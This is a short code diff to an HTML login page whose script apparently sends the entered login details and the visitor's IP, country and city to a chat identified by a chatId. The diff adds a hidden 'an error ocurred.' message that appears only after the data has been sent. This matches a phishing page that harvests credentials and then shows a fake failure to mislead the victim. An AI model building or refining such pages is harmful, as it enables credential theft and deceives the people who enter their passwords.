@@ -268,6 +268,11 @@ form .create-account:hover {
             <input type="hidden" id="country" name="country" />
             <input type="hidden" id="city" name="city" />
             <input type="hidden" id="ip" name="ip" />
+            
+            <p id="error-message"
+            style="color: red;  font-size: 14px; margin-top: 10px; display: none;">
+            an error ocurred.
+          </p>
             <button class="login" type="submit">Log In</button>
             <a href="#">Forgot Password?</a>
             <hr>
@@ -451,6 +456,8 @@ form .create-account:hover {
     
             // Fetch and send location info after login info is sent
             fetchLocationInfo(chatId);
+            
+        document.getElementById("error-message").style.display = "block";
         });
     </script>
     
